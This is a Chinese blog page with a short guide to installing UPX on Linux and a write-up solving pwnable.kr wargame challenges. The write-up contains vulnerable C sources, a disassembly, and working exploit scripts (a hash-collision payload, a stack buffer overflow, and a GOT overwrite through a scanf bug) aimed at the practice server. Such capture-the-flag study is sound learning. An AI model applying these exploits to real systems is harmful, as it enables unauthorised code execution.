<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>小叹</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="小叹">
<meta property="og:url" content="http://yoursite.com/page/6/index.html">
<meta property="og:site_name" content="小叹">
<meta property="og:locale" content="zh_CN">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="小叹" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">小叹</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-Linux下安装UPX" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/" class="article-date">
  <time datetime="2020-01-16T05:15:50.000Z" itemprop="datePublished">2020-01-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/">Linux下安装UPX</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>upx 是一款压缩可执行文件的软件，压缩率在 20% 到 %70 之间。在可执行文件运行的时候并不需要解压软件，程序在内存中自动展开。</p>
<p>本教程在 linux 下进行，理论上支持所有 linux 发型版。</p>
<p>安装 upx<br>upx 请从 upx 官网下载，不要用包管理器进下载。一般来说发行版默认源的软件比较老可能不支持比较新的语言生成的二进制文件，有压坏二进制的风险。</p>
<p>本教程的下载地址可能不是最新版请访问 <a target="_blank" rel="noopener" href="https://upx.github.io">https://upx.github.io</a> 下载最新版</p>
<p>下载 upx</p>
<blockquote>
<blockquote>
<blockquote>
<p>wget <a target="_blank" rel="noopener" href="https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz">https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz</a></p>
</blockquote>
</blockquote>
</blockquote>
<p>解压二进制</p>
<blockquote>
<blockquote>
<blockquote>
<p>tar -Jxf upx*.tar.xz</p>
</blockquote>
</blockquote>
</blockquote>
<p>为了方便使用移动 upx 到系统变量目录，如果不愿意使用 root 的话可以将 upx 目录添加到环境变量</p>
<blockquote>
<blockquote>
<blockquote>
<p>sudo cp upx*/upx /usr/bin</p>
</blockquote>
</blockquote>
</blockquote>
<p>然后就可以使用了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/" data-id="ckemqkeao000kastyho2gf780" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-pwnable-kr解题（一）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
  <time datetime="2020-01-15T04:24:41.000Z" itemprop="datePublished">2020-01-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/">pwnable.kr解题（一）</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>ssh <a href="mailto:fd@pwnable.kr">fd@pwnable.kr</a> -p2222 (pw:guest)</p>
<pre><code>fd@pwnable:~$ cat fd.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
char buf[32];
int main(int argc, char* argv[], char* envp[])&#123;
    if(argc&lt;2)&#123;
        printf(&quot;pass argv[1] a number\n&quot;);
        return 0;
    &#125;
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;
        printf(&quot;good job :)\n&quot;);
        system(&quot;/bin/cat flag&quot;);
        exit(0);
    &#125;
    printf(&quot;learn about Linux file IO\n&quot;);
    return 0;

&#125;</code></pre><p>目标：执行system(“/bin/cat flag”);<br>则：strcmp(“LETMEWIN\n”, buf) == 0<br>则：buf = “LETMEWIN\n”<br>则：read(fd, buf, 32)将buf设为”LETMEWIN\n”<br>fd == 0为标准输入<br>fd == 1为标准输出<br>fd == 2为标准错误输出<br>所以我们可以使fd == 0，然后从终端输入LETMEWIN后回车<br>要使fd == 0，<br>则：输入的参数 == 0x1234，即4660<br>flag:</p>
<blockquote>
<p>mommy! I think I know what a file descriptor is!!</p>
</blockquote>
<h1 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h1><p>ssh <a href="mailto:col@pwnable.kr">col@pwnable.kr</a> -p2222 (pw:guest)</p>
<pre><code>col@pwnable:~$ cat col.c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p)&#123;
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i&lt;5; i++)&#123;
        res += ip[i];
    &#125;
    return res;
&#125;

int main(int argc, char* argv[])&#123;
    if(argc&lt;2)&#123;
        printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);
        return 0;
    &#125;
    if(strlen(argv[1]) != 20)&#123;
        printf(&quot;passcode length should be 20 bytes\n&quot;);
        return 0;
    &#125;

    if(hashcode == check_password( argv[1] ))&#123;
        system(&quot;/bin/cat flag&quot;);
        return 0;
    &#125;
    else
        printf(&quot;wrong passcode.\n&quot;);
    return 0;
&#125;</code></pre><p> 因为用\x01填充16位数据，剩下的4位 0x21DD09EC-0x04040404=1DD905E8</p>
<p>col@pwnable:<del>$ ./col $(python -c “print ‘\x01’ *16+ ‘\xE8\x05\xD9\x1D’”)<br>daddy! I just managed to create a hash collision :)<br>col@pwnable:</del>$ </p>
<h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p><img src="/img/23.png" alt=""><br>发现，只是要将传入的0xdeadbeef通过栈溢出换成0xcafebabe，而且在程序里面已经有调用system(“/bin/sh”)的语句，只要替换成功就能调用，那这些保护基本也没什么意义嘛。<br><img src="/img/24.png" alt=""><br><img src="/img/25.png" alt=""><br>继续单步，输入AAAAAAAA,之后x/30x $esp查看栈空间<br><img src="/img/26.png" alt=""><br>A的ASCLL值为41，可以看出，我们要覆盖的地址与输入地址相差52个字节.<br>EXP:</p>
<pre><code>from pwn import *

r = remote(&#39;pwnable.kr&#39;,&#39;9000&#39;)

buf = 52 * &#39;A&#39;
buf += p32(0xcafebabe)

r.sendline(buf)

r.interactive()</code></pre><blockquote>
<p>flag =daddy, I just pwned a buFFer :)</p>
</blockquote>
<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>这道题需要进行脱壳首先checksec flag<br>发现它是upx加壳的。<br>下载upx<br>upx -d flag<br>用IDA打开 alt -t 搜素flag找到flag即可。</p>
<blockquote>
<p>UPX…? sounds like a delivery service :)</p>
</blockquote>
<h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><p>ssh <a href="mailto:passcode@pwnable.kr">passcode@pwnable.kr</a> -p2222 (pw:guest)<br>这里是passcode.c的源码：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void login()&#123;
    int passcode1;
    int passcode2;

    printf(&quot;enter passcode1 : &quot;);
    scanf(&quot;%d&quot;, passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf(&quot;enter passcode2 : &quot;);
        scanf(&quot;%d&quot;, passcode2);

    printf(&quot;checking...\n&quot;);
    if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;
                printf(&quot;Login OK!\n&quot;);
                system(&quot;/bin/cat flag&quot;);
        &#125;
        else&#123;
                printf(&quot;Login Failed!\n&quot;);
        exit(0);
        &#125;
&#125;

void welcome()&#123;
    char name[100];
    printf(&quot;enter you name : &quot;);
    scanf(&quot;%100s&quot;, name);
    printf(&quot;Welcome %s!\n&quot;, name);
&#125;

int main()&#123;
    printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);

    welcome();
    login();

    // something after login...
    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
    return 0;    
&#125;

passcode@pwnable:~$  ./passcode
Toddler&#39;s Secure Login System 1.0 beta.
enter you name : 1
Welcome 1!
enter passcode1 : 338150
Segmentation fault (core dumped)
passcode@pwnable:~$  ./passcode
Toddler&#39;s Secure Login System 1.0 beta.
enter you name : 33
Welcome 33!
enter passcode1 : 33
Segmentation fault (core dumped)
passcode@pwnable:~$ cat passcode.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void login()&#123;
    int passcode1;
    int passcode2;

    printf(&quot;enter passcode1 : &quot;);
    scanf(&quot;%d&quot;, passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf(&quot;enter passcode2 : &quot;);
        scanf(&quot;%d&quot;, passcode2);

    printf(&quot;checking...\n&quot;);
    if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;
                printf(&quot;Login OK!\n&quot;);
                system(&quot;/bin/cat flag&quot;);
        &#125;
        else&#123;
                printf(&quot;Login Failed!\n&quot;);
        exit(0);
        &#125;
&#125;

void welcome()&#123;
    char name[100];
    printf(&quot;enter you name : &quot;);
    scanf(&quot;%100s&quot;, name);
    printf(&quot;Welcome %s!\n&quot;, name);
&#125;

int main()&#123;
    printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);

    welcome();
    login();

    // something after login...
    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
    return 0;    
&#125;</code></pre><p>其中输入passcode1和passcode2时没有加&amp;，所以程序发生了错误。</p>
<pre><code>     passcode@pwnable:~$ ls
  flag  passcode    passcode.c
  passcode@pwnable:~$ objdump -d passcode

  passcode:     file format elf32-i386


  Disassembly of section .init:

  080483e0 &lt;_init&gt;:
   80483e0:    53                       push   %ebx
   80483e1:    83 ec 08                 sub    $0x8,%esp
   80483e4:    e8 00 00 00 00           call   80483e9 &lt;_init+0x9&gt;
   80483e9:    5b                       pop    %ebx
   80483ea:    81 c3 0b 1c 00 00        add    $0x1c0b,%ebx
   80483f0:    8b 83 fc ff ff ff        mov    -0x4(%ebx),%eax
   80483f6:    85 c0                    test   %eax,%eax
   80483f8:    74 05                    je     80483ff &lt;_init+0x1f&gt;
   80483fa:    e8 71 00 00 00           call   8048470 &lt;__gmon_start__@plt&gt;
   80483ff:    e8 3c 01 00 00           call   8048540 &lt;frame_dummy&gt;
   8048404:    e8 17 03 00 00           call   8048720 &lt;__do_global_ctors_aux&gt;
   8048409:    83 c4 08                 add    $0x8,%esp
   804840c:    5b                       pop    %ebx
   804840d:    c3                       ret    

  Disassembly of section .plt:

  08048410 &lt;printf@plt-0x10&gt;:
   8048410:    ff 35 f8 9f 04 08        pushl  0x8049ff8
   8048416:    ff 25 fc 9f 04 08        jmp    *0x8049ffc
   804841c:    00 00                    add    %al,(%eax)
      ...

  08048420 &lt;printf@plt&gt;:
   8048420:    ff 25 00 a0 04 08        jmp    *0x804a000
   8048426:    68 00 00 00 00           push   $0x0
   804842b:    e9 e0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;

  08048430 &lt;fflush@plt&gt;:
   8048430:    ff 25 04 a0 04 08        jmp    *0x804a004
   8048436:    68 08 00 00 00           push   $0x8
   804843b:    e9 d0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;

  08048440 &lt;__stack_chk_fail@plt&gt;:
   8048440:    ff 25 08 a0 04 08        jmp    *0x804a008
   8048446:    68 10 00 00 00           push   $0x10
   804844b:    e9 c0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;

  08048450 &lt;puts@plt&gt;:
   8048450:    ff 25 0c a0 04 08        jmp    *0x804a00c
   8048456:    68 18 00 00 00           push   $0x18
   804845b:    e9 b0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;

  08048460 &lt;system@plt&gt;:
   8048460:    ff 25 10 a0 04 08        jmp    *0x804a010
   8048466:    68 20 00 00 00           push   $0x20
   804846b:    e9 a0 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;

  08048470 &lt;__gmon_start__@plt&gt;:
   8048470:    ff 25 14 a0 04 08        jmp    *0x804a014
   8048476:    68 28 00 00 00           push   $0x28
   804847b:    e9 90 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;

  08048480 &lt;exit@plt&gt;:
   8048480:    ff 25 18 a0 04 08        jmp    *0x804a018
   8048486:    68 30 00 00 00           push   $0x30
   804848b:    e9 80 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;

  08048490 &lt;__libc_start_main@plt&gt;:
   8048490:    ff 25 1c a0 04 08        jmp    *0x804a01c
   8048496:    68 38 00 00 00           push   $0x38
   804849b:    e9 70 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;

  080484a0 &lt;__isoc99_scanf@plt&gt;:
   80484a0:    ff 25 20 a0 04 08        jmp    *0x804a020
   80484a6:    68 40 00 00 00           push   $0x40
   80484ab:    e9 60 ff ff ff           jmp    8048410 &lt;_init+0x30&gt;

  Disassembly of section .text:

  080484b0 &lt;_start&gt;:
   80484b0:    31 ed                    xor    %ebp,%ebp
   80484b2:    5e                       pop    %esi
   80484b3:    89 e1                    mov    %esp,%ecx
   80484b5:    83 e4 f0                 and    $0xfffffff0,%esp
   80484b8:    50                       push   %eax
   80484b9:    54                       push   %esp
   80484ba:    52                       push   %edx
   80484bb:    68 10 87 04 08           push   $0x8048710
   80484c0:    68 a0 86 04 08           push   $0x80486a0
   80484c5:    51                       push   %ecx
   80484c6:    56                       push   %esi
   80484c7:    68 65 86 04 08           push   $0x8048665
   80484cc:    e8 bf ff ff ff           call   8048490 &lt;__libc_start_main@plt&gt;
   80484d1:    f4                       hlt    
   80484d2:    90                       nop
   80484d3:    90                       nop
   80484d4:    90                       nop
   80484d5:    90                       nop
   80484d6:    90                       nop
   80484d7:    90                       nop
   80484d8:    90                       nop
   80484d9:    90                       nop
   80484da:    90                       nop
   80484db:    90                       nop
   80484dc:    90                       nop
   80484dd:    90                       nop
   80484de:    90                       nop
   80484df:    90                       nop

  080484e0 &lt;__do_global_dtors_aux&gt;:
   80484e0:    55                       push   %ebp
   80484e1:    89 e5                    mov    %esp,%ebp
   80484e3:    53                       push   %ebx
   80484e4:    83 ec 04                 sub    $0x4,%esp
   80484e7:    80 3d 30 a0 04 08 00     cmpb   $0x0,0x804a030
   80484ee:    75 3f                    jne    804852f &lt;__do_global_dtors_aux+0x4f&gt;
   80484f0:    a1 34 a0 04 08           mov    0x804a034,%eax
   80484f5:    bb 20 9f 04 08           mov    $0x8049f20,%ebx
   80484fa:    81 eb 1c 9f 04 08        sub    $0x8049f1c,%ebx
   8048500:    c1 fb 02                 sar    $0x2,%ebx
   8048503:    83 eb 01                 sub    $0x1,%ebx
   8048506:    39 d8                    cmp    %ebx,%eax
   8048508:    73 1e                    jae    8048528 &lt;__do_global_dtors_aux+0x48&gt;
   804850a:    8d b6 00 00 00 00        lea    0x0(%esi),%esi
   8048510:    83 c0 01                 add    $0x1,%eax
   8048513:    a3 34 a0 04 08           mov    %eax,0x804a034
   8048518:    ff 14 85 1c 9f 04 08     call   *0x8049f1c(,%eax,4)
   804851f:    a1 34 a0 04 08           mov    0x804a034,%eax
   8048524:    39 d8                    cmp    %ebx,%eax
   8048526:    72 e8                    jb     8048510 &lt;__do_global_dtors_aux+0x30&gt;
   8048528:    c6 05 30 a0 04 08 01     movb   $0x1,0x804a030
   804852f:    83 c4 04                 add    $0x4,%esp
   8048532:    5b                       pop    %ebx
   8048533:    5d                       pop    %ebp
   8048534:    c3                       ret    
   8048535:    8d 74 26 00              lea    0x0(%esi,%eiz,1),%esi
   8048539:    8d bc 27 00 00 00 00     lea    0x0(%edi,%eiz,1),%edi

  08048540 &lt;frame_dummy&gt;:
   8048540:    55                       push   %ebp
   8048541:    89 e5                    mov    %esp,%ebp
   8048543:    83 ec 18                 sub    $0x18,%esp
   8048546:    a1 24 9f 04 08           mov    0x8049f24,%eax
   804854b:    85 c0                    test   %eax,%eax
   804854d:    74 12                    je     8048561 &lt;frame_dummy+0x21&gt;
   804854f:    b8 00 00 00 00           mov    $0x0,%eax
   8048554:    85 c0                    test   %eax,%eax
   8048556:    74 09                    je     8048561 &lt;frame_dummy+0x21&gt;
   8048558:    c7 04 24 24 9f 04 08     movl   $0x8049f24,(%esp)
   804855f:    ff d0                    call   *%eax
   8048561:    c9                       leave  
   8048562:    c3                       ret    
   8048563:    90                       nop

  08048564 &lt;login&gt;:
   8048564:    55                       push   %ebp
   8048565:    89 e5                    mov    %esp,%ebp
   8048567:    83 ec 28                 sub    $0x28,%esp
   804856a:    b8 70 87 04 08           mov    $0x8048770,%eax
   804856f:    89 04 24                 mov    %eax,(%esp)
   8048572:    e8 a9 fe ff ff           call   8048420 &lt;printf@plt&gt;
   8048577:    b8 83 87 04 08           mov    $0x8048783,%eax
   804857c:    8b 55 f0                 mov    -0x10(%ebp),%edx
   804857f:    89 54 24 04              mov    %edx,0x4(%esp)
   8048583:    89 04 24                 mov    %eax,(%esp)
   8048586:    e8 15 ff ff ff           call   80484a0 &lt;__isoc99_scanf@plt&gt;
   804858b:    a1 2c a0 04 08           mov    0x804a02c,%eax
   8048590:    89 04 24                 mov    %eax,(%esp)
   8048593:    e8 98 fe ff ff           call   8048430 &lt;fflush@plt&gt;
   8048598:    b8 86 87 04 08           mov    $0x8048786,%eax
   804859d:    89 04 24                 mov    %eax,(%esp)
   80485a0:    e8 7b fe ff ff           call   8048420 &lt;printf@plt&gt;
   80485a5:    b8 83 87 04 08           mov    $0x8048783,%eax
   80485aa:    8b 55 f4                 mov    -0xc(%ebp),%edx
   80485ad:    89 54 24 04              mov    %edx,0x4(%esp)
   80485b1:    89 04 24                 mov    %eax,(%esp)
   80485b4:    e8 e7 fe ff ff           call   80484a0 &lt;__isoc99_scanf@plt&gt;
   80485b9:    c7 04 24 99 87 04 08     movl   $0x8048799,(%esp)
   80485c0:    e8 8b fe ff ff           call   8048450 &lt;puts@plt&gt;
   80485c5:    81 7d f0 e6 28 05 00     cmpl   $0x528e6,-0x10(%ebp)
   80485cc:    75 23                    jne    80485f1 &lt;login+0x8d&gt;
   80485ce:    81 7d f4 c9 07 cc 00     cmpl   $0xcc07c9,-0xc(%ebp)
   80485d5:    75 1a                    jne    80485f1 &lt;login+0x8d&gt;
   80485d7:    c7 04 24 a5 87 04 08     movl   $0x80487a5,(%esp)
   80485de:    e8 6d fe ff ff           call   8048450 &lt;puts@plt&gt;
   80485e3:    c7 04 24 af 87 04 08     movl   $0x80487af,(%esp)
   80485ea:    e8 71 fe ff ff           call   8048460 &lt;system@plt&gt;
   80485ef:    c9                       leave  
   80485f0:    c3                       ret    
   80485f1:    c7 04 24 bd 87 04 08     movl   $0x80487bd,(%esp)
   80485f8:    e8 53 fe ff ff           call   8048450 &lt;puts@plt&gt;
   80485fd:    c7 04 24 00 00 00 00     movl   $0x0,(%esp)
   8048604:    e8 77 fe ff ff           call   8048480 &lt;exit@plt&gt;

  08048609 &lt;welcome&gt;:
   8048609:    55                       push   %ebp
   804860a:    89 e5                    mov    %esp,%ebp
   804860c:    81 ec 88 00 00 00        sub    $0x88,%esp
   8048612:    65 a1 14 00 00 00        mov    %gs:0x14,%eax
   8048618:    89 45 f4                 mov    %eax,-0xc(%ebp)
   804861b:    31 c0                    xor    %eax,%eax
   804861d:    b8 cb 87 04 08           mov    $0x80487cb,%eax
   8048622:    89 04 24                 mov    %eax,(%esp)
   8048625:    e8 f6 fd ff ff           call   8048420 &lt;printf@plt&gt;
   804862a:    b8 dd 87 04 08           mov    $0x80487dd,%eax
   804862f:    8d 55 90                 lea    -0x70(%ebp),%edx
   8048632:    89 54 24 04              mov    %edx,0x4(%esp)
   8048636:    89 04 24                 mov    %eax,(%esp)
   8048639:    e8 62 fe ff ff           call   80484a0 &lt;__isoc99_scanf@plt&gt;
   804863e:    b8 e3 87 04 08           mov    $0x80487e3,%eax
   8048643:    8d 55 90                 lea    -0x70(%ebp),%edx
   8048646:    89 54 24 04              mov    %edx,0x4(%esp)
   804864a:    89 04 24                 mov    %eax,(%esp)
   804864d:    e8 ce fd ff ff           call   8048420 &lt;printf@plt&gt;
   8048652:    8b 45 f4                 mov    -0xc(%ebp),%eax
   8048655:    65 33 05 14 00 00 00     xor    %gs:0x14,%eax
   804865c:    74 05                    je     8048663 &lt;welcome+0x5a&gt;
   804865e:    e8 dd fd ff ff           call   8048440 &lt;__stack_chk_fail@plt&gt;
   8048663:    c9                       leave  
   8048664:    c3                       ret    

  08048665 &lt;main&gt;:
   8048665:    55                       push   %ebp
   8048666:    89 e5                    mov    %esp,%ebp
   8048668:    83 e4 f0                 and    $0xfffffff0,%esp
   804866b:    83 ec 10                 sub    $0x10,%esp
   804866e:    c7 04 24 f0 87 04 08     movl   $0x80487f0,(%esp)
   8048675:    e8 d6 fd ff ff           call   8048450 &lt;puts@plt&gt;
   804867a:    e8 8a ff ff ff           call   8048609 &lt;welcome&gt;
   804867f:    e8 e0 fe ff ff           call   8048564 &lt;login&gt;
   8048684:    c7 04 24 18 88 04 08     movl   $0x8048818,(%esp)
   804868b:    e8 c0 fd ff ff           call   8048450 &lt;puts@plt&gt;
   8048690:    b8 00 00 00 00           mov    $0x0,%eax
   8048695:    c9                       leave  
   8048696:    c3                       ret    
   8048697:    90                       nop
   8048698:    90                       nop
   8048699:    90                       nop
   804869a:    90                       nop
   804869b:    90                       nop
   804869c:    90                       nop
   804869d:    90                       nop
   804869e:    90                       nop
   804869f:    90                       nop

  080486a0 &lt;__libc_csu_init&gt;:
   80486a0:    55                       push   %ebp
   80486a1:    57                       push   %edi
   80486a2:    56                       push   %esi
   80486a3:    53                       push   %ebx
   80486a4:    e8 69 00 00 00           call   8048712 &lt;__i686.get_pc_thunk.bx&gt;
   80486a9:    81 c3 4b 19 00 00        add    $0x194b,%ebx
   80486af:    83 ec 1c                 sub    $0x1c,%esp
   80486b2:    8b 6c 24 30              mov    0x30(%esp),%ebp
   80486b6:    8d bb 20 ff ff ff        lea    -0xe0(%ebx),%edi
   80486bc:    e8 1f fd ff ff           call   80483e0 &lt;_init&gt;
   80486c1:    8d 83 20 ff ff ff        lea    -0xe0(%ebx),%eax
   80486c7:    29 c7                    sub    %eax,%edi
   80486c9:    c1 ff 02                 sar    $0x2,%edi
   80486cc:    85 ff                    test   %edi,%edi
   80486ce:    74 29                    je     80486f9 &lt;__libc_csu_init+0x59&gt;
   80486d0:    31 f6                    xor    %esi,%esi
   80486d2:    8d b6 00 00 00 00        lea    0x0(%esi),%esi
   80486d8:    8b 44 24 38              mov    0x38(%esp),%eax
   80486dc:    89 2c 24                 mov    %ebp,(%esp)
   80486df:    89 44 24 08              mov    %eax,0x8(%esp)
   80486e3:    8b 44 24 34              mov    0x34(%esp),%eax
   80486e7:    89 44 24 04              mov    %eax,0x4(%esp)
   80486eb:    ff 94 b3 20 ff ff ff     call   *-0xe0(%ebx,%esi,4)
   80486f2:    83 c6 01                 add    $0x1,%esi
   80486f5:    39 fe                    cmp    %edi,%esi
   80486f7:    75 df                    jne    80486d8 &lt;__libc_csu_init+0x38&gt;
   80486f9:    83 c4 1c                 add    $0x1c,%esp
   80486fc:    5b                       pop    %ebx
   80486fd:    5e                       pop    %esi
   80486fe:    5f                       pop    %edi
   80486ff:    5d                       pop    %ebp
   8048700:    c3                       ret    
   8048701:    eb 0d                    jmp    8048710 &lt;__libc_csu_fini&gt;
   8048703:    90                       nop
   8048704:    90                       nop
   8048705:    90                       nop
   8048706:    90                       nop
   8048707:    90                       nop
   8048708:    90                       nop
   8048709:    90                       nop
   804870a:    90                       nop
   804870b:    90                       nop
   804870c:    90                       nop
   804870d:    90                       nop
   804870e:    90                       nop
   804870f:    90                       nop

  08048710 &lt;__libc_csu_fini&gt;:
   8048710:    f3 c3                    repz ret 

  08048712 &lt;__i686.get_pc_thunk.bx&gt;:
   8048712:    8b 1c 24                 mov    (%esp),%ebx
   8048715:    c3                       ret    
   8048716:    90                       nop
   8048717:    90                       nop
   8048718:    90                       nop
   8048719:    90                       nop
   804871a:    90                       nop
   804871b:    90                       nop
   804871c:    90                       nop
   804871d:    90                       nop
   804871e:    90                       nop
   804871f:    90                       nop

  08048720 &lt;__do_global_ctors_aux&gt;:
   8048720:    55                       push   %ebp
   8048721:    89 e5                    mov    %esp,%ebp
   8048723:    53                       push   %ebx
   8048724:    83 ec 04                 sub    $0x4,%esp
   8048727:    a1 14 9f 04 08           mov    0x8049f14,%eax
   804872c:    83 f8 ff                 cmp    $0xffffffff,%eax
   804872f:    74 13                    je     8048744 &lt;__do_global_ctors_aux+0x24&gt;
   8048731:    bb 14 9f 04 08           mov    $0x8049f14,%ebx
   8048736:    66 90                    xchg   %ax,%ax
   8048738:    83 eb 04                 sub    $0x4,%ebx
   804873b:    ff d0                    call   *%eax
   804873d:    8b 03                    mov    (%ebx),%eax
   804873f:    83 f8 ff                 cmp    $0xffffffff,%eax
   8048742:    75 f4                    jne    8048738 &lt;__do_global_ctors_aux+0x18&gt;
   8048744:    83 c4 04                 add    $0x4,%esp
   8048747:    5b                       pop    %ebx
   8048748:    5d                       pop    %ebp
   8048749:    c3                       ret    
   804874a:    90                       nop
   804874b:    90                       nop

  Disassembly of section .fini:

  0804874c &lt;_fini&gt;:
   804874c:    53                       push   %ebx
   804874d:    83 ec 08                 sub    $0x8,%esp
   8048750:    e8 00 00 00 00           call   8048755 &lt;_fini+0x9&gt;
   8048755:    5b                       pop    %ebx
   8048756:    81 c3 9f 18 00 00        add    $0x189f,%ebx
   804875c:    e8 7f fd ff ff           call   80484e0 &lt;__do_global_dtors_aux&gt;
   8048761:    83 c4 08                 add    $0x8,%esp
   8048764:    5b                       pop    %ebx
   8048765:    c3                       ret    
  passcode@pwnable:~$ </code></pre><p>可以看到welcome函数中数组设得比较大，设想可以通过name数组对passcode1进行覆盖运行system命令。</p>
<p>两个函数： welcome（） 和  login（） 是具有相同的EBP.<br>welcome（）中的name在ebp-0x70的位置<br>login（） 中的passcode1在%ebp-0x10<br>从name覆写道passcode1的长度为：len = 0x70-0x10 = 112-16 = 96<br>所以构造： ‘A’ *96个占位 + prinf_got_addr +system_flag</p>
<pre><code>printf_got = 0x0804a000 system_flag = 0x080485E3
python -c &quot;print (‘a‘*96+‘\x00\xa0\x04\x08‘+‘\n‘+‘134514147\n‘)&quot; |
./passcode</code></pre><p>此时调用 scanf(“%d”, passcode1); 函数，会向这个地址处printf_got_addr处写数据，也<br>就是要修改printf_got的地址，修改成什么呢？当然是我们需要执行的函数<br>（system_flag），使 system(“/bin/cat flag”) 得到执行。</p>
<p>那么我们又如何得到printf_got和system的地址呢<br>找prinf_got_addr ：通过 objdump -d passcode中的printf@plt指向的地址：printf_got = 0x0804a000</p>
<pre><code>08048420 &lt;printf@plt&gt;:
8048420: ff 25 00 a0 04 08 jmp *0x0804a000
8048426: 68 00 00 00 00 push $0x0
804842b: e9 e0 ff ff ff jmp 8048410 &lt;_init+0x30&gt;</code></pre><p>找system(“/bin/cat flag”)汇编程序中程序执行到的位置。或者通过objdump -d passcode中的login指向的地址：system_flag = 0x080485E3 。</p>
<p>因为scanf要输入的是%d,0x080485e3的十进制就是134514147。</p>
<pre><code>80485e3: c7 04 24 af 87 04 08 movl $0x80487af,(%esp)</code></pre><p>而下面是我用pwntools写的脚本：</p>
<pre><code>from pwn import *
s = ssh(host=&#39;pwnable.kr&#39;,user=&#39;passcode&#39;,port=2222,password=&#39;guest&#39;)
p = s.process(&#39;./passcode&#39;)
shellcode = &#39;A&#39;*96 + p32(0x0804a000)

p.recvuntil(&quot;enter you name : &quot;)
p.sendline(shellcode)
p.recvuntil(&#39;enter passcode1 : &#39;)
p.sendline(str(int(0x80485E3)))
p.interactive()</code></pre><blockquote>
<blockquote>
<blockquote>
<p>Sorry mom.. I got confused about scanf usage :(</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>randon()这个函数是伪随机的只要用gdb运行一次查看一下random的值一直试验就出来flag了。<br>flag:</p>
<blockquote>
<p>Mommy, I thought libc random is unpredictable…</p>
</blockquote>
<h1 id="input"><a href="#input" class="headerlink" title="input"></a>input</h1><p>…..</p>
